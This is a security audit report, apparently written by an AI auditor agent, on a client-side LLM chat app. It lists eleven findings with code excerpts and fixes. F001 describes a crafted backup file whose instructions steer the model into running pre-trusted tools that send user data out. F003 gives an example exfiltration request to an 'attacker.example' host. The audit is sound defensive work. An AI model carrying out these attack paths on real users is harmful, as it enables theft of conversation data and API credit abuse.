<!-- REGEN:START — everything here is rewritten at each phase boundary -->
# Audit — aspect-chat (Aspect Studio)

## Scope & method

- **Commit:** `7683d210c84acd1095be33adc68b75abad8db937` (branch `main`)
- **Date:** 2026-09-07
- **Languages:** JavaScript (ES modules, browser + one Node script). ~7,600 LOC of app
  source across `src/js/` (25 modules), plus `llama-bridge/server.js` (228 LOC Node
  reverse proxy) and `scripts/ImageUpscaler.js` (standalone CLI).
- **Files audited:** every tracked `.js` under `src/`, `llama-bridge/`, `scripts/`;
  `index.html`; `vite.config.js`; `vitest.config.js`; `package.json` /
  `package-lock.json`; `SECURITY.md` and `DEPENDENCY_REPORT.md` (claims cross-checked
  against code).
- **Tools run:** `npm audit --omit=dev` (0 vulnerabilities), `npm test` (357 tests /
  20 files pass). eslint, semgrep, gitleaks, shellcheck, trivy, ctags were not
  installed in the environment, so static-analysis coverage is manual only.
- **Model:** Claude Sonnet 5 (`claude-sonnet-5`), auditor agent.
- **Not covered:** no runtime / browser execution, no WebGPU/WebLLM path exercised, no
  real provider endpoints contacted, no load or fuzz testing, no review of the
  untracked `desktop/` install scripts or `aspect-chat.desktop` (not part of the
  commit), no audit of bundled third-party source beyond version/advisory checks, CSS
  not reviewed for correctness.

## Executive summary

The single worst issue: importing a whole-library backup file
(`Settings > Backup & restore > Import Aspects file`) silently re-grants execution
trust to every tool it carries and honours a `allowNetwork: true` flag baked into the
file, so a shared `*.aspects.json` can land pre-trusted, network-enabled tool code that
runs in the sandbox with no review prompt (F001). This is the exact attack the
per-`.aspect` review gate was built to stop; the library path just skips it. The
sandbox iframe still contains the code (no DOM, no same-origin storage), which is why
this is High rather than Critical — the realistic damage is exfiltration of whatever
data a tool is handed plus API-credit spend via `SummonAspect`.

Recurring theme: trust and permission decisions are attached to mutable per-tool fields
(`trustedHash`, `allowNetwork`) that travel inside user-importable documents, and the
two import paths (`zip.js` vs `backup.js`) sanitise them inconsistently. Beyond that,
the security posture is genuinely well-considered for a client-side app: the Markdown
sink is hardened past DOMPurify defaults, `data-action` delegation is explicitly walled
off from chat content, tool code runs in an opaque-origin sandboxed iframe with
`connect-src 'none'`, and persistence has real anti-data-loss machinery. The local
`llama-bridge` proxy ships an over-permissive `Access-Control-Allow-Origin: *` default
with no `Host` check (F002).

Scale: 1 high, 2 medium, 7 low, 1 note across 8 files. Most lows are contained
(self-inflicted config, cosmetic, or needing a same-page attacker). No SQL, no server
auth surface, no secrets in the repo (gitleaks not run, but manual review and
`npm audit` are clean). The audit could not observe runtime behaviour, so
concurrency/timing findings rest on code reading only.

## Findings by severity

### High

| ID | Location | Category | Claim | Confidence |
|----|----------|----------|-------|------------|
| F001 | src/js/modules/backup.js:63 | security | Whole-library JSON import re-grants tool trust and keeps per-tool `allowNetwork`, bypassing the `.aspect` review gate | confirmed |

### Medium

| ID | Location | Category | Claim | Confidence |
|----|----------|----------|-------|------------|
| F002 | src/js/modules/persist.js:370 | security | `parseLibrary` does not strip `trustedHash`/`toolsReviewed`/`allowNetwork` from imported tool objects | confirmed |
| F003 | src/js/modules/tools.js:251 | security | One-time single-URL consent grants a tool unrestricted `fetch` to any URL/method/body thereafter | confirmed |

### Low

| ID | Location | Category | Claim | Confidence |
|----|----------|----------|-------|------------|
| F004 | src/js/modules/toolSandbox.js:124 | security | Sandbox↔parent message channel id is `Math.random()`-derived | confirmed |
| F005 | src/js/modules/toolSandbox.js:154 | error-handling | Pending in-sandbox `fetch` promises never rejected on teardown | confirmed |
| F006 | src/js/modules/workflowBuilder.js:241 | maintainability | Workflow codegen interpolates config values into JS string literals unescaped | confirmed |
| F007 | src/js/modules/workflowBuilder.js:269 | api-contract | Workflow tools saved without `trustedHash` but reported as a plain success | confirmed |
| F008 | package.json:34 | dependency | `pdfjs-dist` two majors behind; parses untrusted PDF/DOCX | confirmed |
| F009 | vite.config.js:33 | config | CSP is build-only; raw `index.html` ships none | plausible |
| F011 | src/js/modules/llm.js:60 | correctness | SSE `TextDecoder` never gets a final flush; trailing multibyte char can be mangled | confirmed |

### Note

| ID | Location | Category | Claim | Confidence |
|----|----------|----------|-------|------------|
| F010 | SECURITY.md:8 | maintainability | Doc describes tool execution as a "Web Worker"; implementation is a sandboxed iframe | confirmed |

## Systemic themes

- **Import-path trust inconsistency (F001, F002).** `zip.js loadAspectFile` carefully
  sets `toolsReviewed: tools.length === 0` and imports only `{name, code, state}`, so
  `.aspect` tools stay inert. `backup.js importAllAspects` → `persist.js parseLibrary`
  spreads the raw record through `normalizeAspect`, which then *grandfathers* any tool
  whose `trustedHash` is undefined (or matches) and leaves `allowNetwork` untouched.
  Same trust model, two code paths, opposite defaults.
- **Security-relevant state lives in shareable documents.** `trustedHash` and
  `allowNetwork` are persisted on the tool object and included by
  `serializeAspect`/`snapshotRecords` in library exports and snapshots. Anything that
  round-trips an aspect through a file is a place those fields can be forged
  (F001, F002); the `.aspect` format sidesteps this only by not carrying the fields.
- **Coarse, sticky network permission (F001, F003).** Once `allowNetwork` is true —
  by user click or by import — it applies to every URL, method, header and body for
  the life of the tool, and the response body is returned to the tool. There is no
  origin scoping and no per-request visibility.
- **Documentation drift (F010, and the CSP note in F009).** `SECURITY.md` still
  describes the Worker-based sandbox and the `toolsReviewed`-boolean gate; the code has
  moved to a sandboxed iframe and a hash-keyed per-tool trust model.

## Design opinions

- **`normalizeAspect` doubles as a trust-granting function.** Its "grandfather legacy
  tools" branch computes and stores `trustedHash` for any tool that lacks one. That is
  convenient for hand-authored aspects but means "normalise this object" and "trust
  this code" are the same call, which is how F001 arises. Splitting normalisation from
  any trust mutation would make each import site state its intent explicitly.
- **API keys in `localStorage` by default (SECURITY.md item 4).** A defensible,
  documented, reversible trade-off for a daily-driver client app with no backend;
  called out here only so it is on the record, not as a defect.
- **`llama-bridge` forwards the client `Authorization` header verbatim to
  `LLAMA_API_URL`.** Fine for the stated local use, but combined with the `*` CORS
  default (F002) it means any web page could relay a bearer token of its choosing to
  whatever the bridge points at.
- **A single 979-line `ui.js`** mixes view switching, editor hydration, knowledge-file
  UI, background presets, toasts and file uploads. Not a bug, but the module is the
  most likely place for a future regression to hide.

## Strengths

- **`chat.js:31-53` — Markdown sink hardened past DOMPurify defaults:**
  `FORBID_ATTR: ['style','id']`, `ALLOW_DATA_ATTR: false`, form controls forbidden,
  and an `afterSanitizeAttributes` hook that forces `target=_blank rel=noopener` on
  links. The rationale (clickjacking overlays, `data-action` hijack, id shadowing) is
  written down and correct.
- **`main.js:214-232` — defence in depth for the action delegator:** `data-action`
  clicks are ignored inside `#chat-messages, .message-wrapper`, so even a DOMPurify
  bypass that landed an `<a data-action>` in a bubble could not fire a privileged
  action. Two independent barriers for one risk.
- **`toolSandbox.js:1-20, 22, 244-252` — the sandbox design is sound and documented:**
  `sandbox="allow-scripts"` without `allow-same-origin` (opaque origin, storage
  throws), CSP `connect-src 'none'`, `XMLHttpRequest`/`WebSocket`/`EventSource`
  neutralised, `</script` in tool code escaped, all network forced through a parent
  broker.
- **`persist.js:26-53, 80-110` — real anti-data-loss engineering:** persistence
  "disarms" after a failed load so a transient IndexedDB error cannot trigger a
  rebuild-and-purge; `saveAspects` skips its delete pass on an empty record set;
  rolling 8-deep snapshots on a throttle.
- **`llm.js:270-289` — clean transport abstraction with correct abort semantics:** one
  `streamChat` covers HTTP and WebLLM; the fallback provider is tried on everything
  except a user abort, which is never retried.
- **`providers.js:154-194` — `isLocalEndpoint` is careful:** loopback, RFC1918,
  100.64/10 CGNAT, 169.254/16 link-local, `.local/.internal/.lan`, plus a
  string-parse fallback for a half-typed URL so the key field behaves while typing.
- **Test posture:** 357 passing tests over 20 files with an 80% line/branch/function
  coverage threshold enforced in `vitest.config.js`; `toolHardening`, `toolSandbox`,
  `zip`, `persist` each have targeted suites, and the assertions check behaviour
  (parsed args survive `)` and newlines; trust re-arms on any code edit) rather than
  being tautological.

## Verification & limitations

- **Findings:** 11 recorded — 10 `confirmed`, 1 `plausible` (F009, which depends on how
  a given user deploys the app). 0 rejected. No findings needed downgrading during
  write-up; F001 was considered for Critical and set to High because the sandbox iframe
  demonstrably contains the executed code.
- **Estimated false-positive risk:** low, roughly 0–1 of the 11. Every finding cites
  code read in this pass; the trust-bypass chain (F001/F002) was traced through
  `backup.js` → `persist.js` → `aspects.js normalizeAspect` and cross-checked against
  `tests/toolHardening.test.js`, which encodes the grandfathering behaviour as
  expected.
- **Blind spots:** no runtime observation, so any race in the agentic tool loop,
  generation-depth teardown, or WebLLM engine serialisation is assessed from reading
  only; the DOMPurify configuration was reviewed but not fuzzed; bundled dependency
  source was not read; the untracked `desktop/` scripts are out of scope.
<!-- REGEN:END -->

## Findings Log

### F001 — [HIGH] src/js/modules/backup.js:63 — library import bypasses the tool review gate
**Category:** security  **Confidence:** confirmed
**Code:**
```js
const added = incoming.map(a => normalizeAspect({ ...a, id: newId('aspect') }));
state.aspects.push(...added);
```
`incoming` comes from `parseLibrary` (F002), which does not sanitise tool objects.
`normalizeAspect` (aspects.js:424-432) sets `grandfather = aspect.toolsReviewed !== false`
and then, for every tool with `trustedHash === undefined`, does
`tool.trustedHash = hashToolCode(tool.code)` — i.e. it trusts it. A crafted file can
also just ship a matching `trustedHash` and `allowNetwork: true` directly; both survive
the `{ ...a }` spread.
**Trigger:** user runs `Settings > Backup & restore > Import Aspects file` on a
`*.aspects.json` from an untrusted source (the app actively encourages sharing Aspects).
**Impact:** the imported aspect's tools pass `isToolTrusted`, and `brokerToolFetch`
skips its confirm because `allowNetwork` is already `true`. The malicious aspect's own
`instructions` make the model emit `[Run Tool: X(...)]`; the tool then runs in the
sandbox iframe and can POST the data it is handed (args, `aspect.memory`, chained
`SummonAspect` replies) to any host, and spend the user's API credits. Contrast
`zip.js:308` which forces `toolsReviewed: tools.length === 0` for `.aspect` files.
**Fix:** in `parseLibrary`/`importAllAspects`, strip `trustedHash`, `toolsReviewed` and
`allowNetwork` from every imported tool and set `toolsReviewed: false` when tools are
present, mirroring the `.aspect` path.

### F002 — [MEDIUM] src/js/modules/persist.js:370 — parseLibrary does not sanitise imported tool objects
**Category:** security  **Confidence:** confirmed
**Code:**
```js
return list
    .filter(a => a && typeof a === 'object')
    .map(a => normalizeConversations(a));
```
**Trigger:** any file passed to `importAllAspects`; `parseLibrary` only runs
`normalizeConversations`, which does not touch `tools`.
**Impact:** root cause feeding F001 — the trust-relevant fields `trustedHash`,
`toolsReviewed` and `allowNetwork` from an attacker-supplied JSON reach
`normalizeAspect` unchanged.
**Fix:** sanitise each aspect's `tools` here (drop `trustedHash`/`allowNetwork`, force
`toolsReviewed: false` when tools exist) before returning.

### F003 — [MEDIUM] src/js/modules/tools.js:251 — network grant is all-or-nothing and permanent
**Category:** security  **Confidence:** confirmed
**Code:**
```js
const granted = ask(
    `The tool "${tool.name}" wants to make a network request:\n\n` +
    `  ${req.method} ${req.url}\n\n` +
    `Allow this tool to access the network? ...`);
tool.allowNetwork = !!granted;
...
const resp = await fetch(req.url, { method: req.method || 'GET', headers: req.headers || undefined, body: req.body });
```
**Trigger:** a trusted tool prompts for an innocuous `GET https://api.example.com`, the
user approves, and a later call does `POST https://attacker.example/collect` with the
conversation contents.
**Impact:** unrestricted data-exfiltration / browser-side SSRF channel with no
per-origin scoping; the response body is handed back to the tool. The consent dialog
implies a specific request. The prompt does warn "It can then send data anywhere", so
this is partially disclosed.
**Fix:** scope the grant to an origin (or a user-editable allowlist), re-prompt on a
new origin, and log every outbound request into the transcript.

### F004 — [LOW] src/js/modules/toolSandbox.js:124 — predictable channel token
**Category:** security  **Confidence:** confirmed
**Code:**
```js
const randomChannel = () =>
    'ch_' + Math.random().toString(36).slice(2) + Date.now().toString(36);
```
The sandbox posts with `origin === "null"`, so this channel id is the only
authenticator for `net-result` / `done` messages between frame and parent.
**Trigger:** a same-page script/frame that can `postMessage` to the parent and
predicts the channel value mid-run.
**Impact:** spoofed completion or network results for that run. Requires an attacker
already running script on the page, so limited.
**Fix:** `crypto.randomUUID()` / `crypto.getRandomValues`.

### F005 — [LOW] src/js/modules/toolSandbox.js:154 — pending fetch promises not rejected on teardown
**Category:** error-handling  **Confidence:** confirmed
**Code:**
```js
const cleanup = () => {
    if (timer) clearTimeout(timer);
    window.removeEventListener('message', onMessage);
    if (onAbort && signal) signal.removeEventListener('abort', onAbort);
    if (iframe && iframe.parentNode) iframe.parentNode.removeChild(iframe);
    iframe = null;
};
```
`netWaiters` entries created by the in-sandbox `self.fetch` shim are never rejected
when the run ends by timeout/abort/completion.
**Trigger:** a tool that starts a `fetch` it does not await, or a timeout while a
brokered request is outstanding.
**Impact:** an unsettled promise inside a frame that is being discarded — contained,
but a latent gap.
**Fix:** on cleanup, reject every outstanding `netWaiters` entry.

### F006 — [LOW] src/js/modules/workflowBuilder.js:241 — unescaped codegen in the workflow compiler
**Category:** maintainability  **Confidence:** confirmed
**Code:**
```js
const url = "${urlVal}" || currentData.url || currentData;
...
const key = "${keyVal}";
```
**Trigger:** a user types a `"` or newline into the Fetch-URL or Save-Memory-Key field
of the visual builder.
**Impact:** produces broken or unintended tool source. Self-inflicted, and the output
is inert until reviewed and saved in the editor (no `trustedHash`), so no privilege
gain.
**Fix:** `JSON.stringify()` each interpolated value instead of wrapping in raw quotes.

### F007 — [LOW] src/js/modules/workflowBuilder.js:269 — workflow tools saved inert, reported as success
**Category:** api-contract  **Confidence:** confirmed
**Code:**
```js
aspect.tools.push({
    name: toolName,
    code: compiledCode
});
...
showToast(`Workflow saved as ${toolName}!`);
```
No `trustedHash`, so `isToolTrusted` returns `false` and the tool will not run until
opened and saved in the editor. The toast does not say so.
**Fix:** stamp `trustedHash` on save (the user built it) or reword the toast to name
the review step.

### F008 — [LOW] package.json:34 — PDF/DOCX parsers well behind upstream
**Category:** dependency  **Confidence:** confirmed
**Code:**
```json
"pdfjs-dist": "^4.10.38"
```
Resolved: `pdfjs-dist@4.10.38`, `@xmldom/xmldom@0.8.15` (via `mammoth`).
**Trigger:** attaching a hostile PDF or `.docx` as a knowledge file.
**Impact:** `4.10.38` post-dates the CVE-2024-4367 fix so no currently-known critical
hole, but the code that parses untrusted binaries is two majors behind. `npm audit` is
clean today.
**Fix:** schedule the `pdfjs-dist` 4→6 upgrade with a QA pass on PDF import, as
`DEPENDENCY_REPORT.md` already notes.

### F009 — [LOW] vite.config.js:33 — CSP is build-only
**Category:** config  **Confidence:** plausible
**Code:**
```js
return {
    name: 'inject-csp-meta',
    apply: 'build',
    transformIndexHtml(html) { ... }
};
```
`index.html` carries no CSP of its own.
**Trigger:** serving the repo's `index.html` directly without `vite build` — plausible
given the "local only web app" framing and the desktop launcher scripts.
**Impact:** no CSP backstop for the DOMPurify sink or the tool sandbox in that mode.
**Fix:** also ship a static CSP meta in `index.html` (a superset the dev server
tolerates), or document that only the built output is supported.

### F010 — [NOTE] SECURITY.md:8 — doc describes a Worker; code uses a sandboxed iframe
**Category:** maintainability  **Confidence:** confirmed
**Code:**
```
execution happens in an isolated Web Worker (no access to `window`, `document`, or the
main thread's `localStorage`/IndexedDB connections)
```
`toolSandbox.js` runs tools in an `about:srcdoc` `sandbox="allow-scripts"` iframe with a
`connect-src 'none'` CSP, and trust is per-tool via `trustedHash`, not a
`toolsReviewed` boolean.
**Impact:** a reader reasoning about the threat model from the doc works from a stale
mechanism (the iframe is arguably stronger).
**Fix:** update SECURITY.md items 1, 5, 6 to the current design.

### F011 — [LOW] src/js/modules/llm.js:60 — SSE decoder lacks a final flush
**Category:** correctness  **Confidence:** confirmed
**Code:**
```js
for (;;) {
    const { done, value } = await reader.read();
    if (done) break;
    pending += decoder.decode(value, { stream: true });
    ...
}
...
if (pending) consumeLine(pending);
```
No terminating `decoder.decode()` call.
**Trigger:** a streamed completion whose final chunk ends mid-multibyte sequence (e.g.
an emoji as the last token) with no trailing newline/`[DONE]`.
**Impact:** rare and cosmetic — the last character is occasionally replaced with U+FFFD.
**Fix:** after the loop, `pending += decoder.decode()` before the final `consumeLine`.
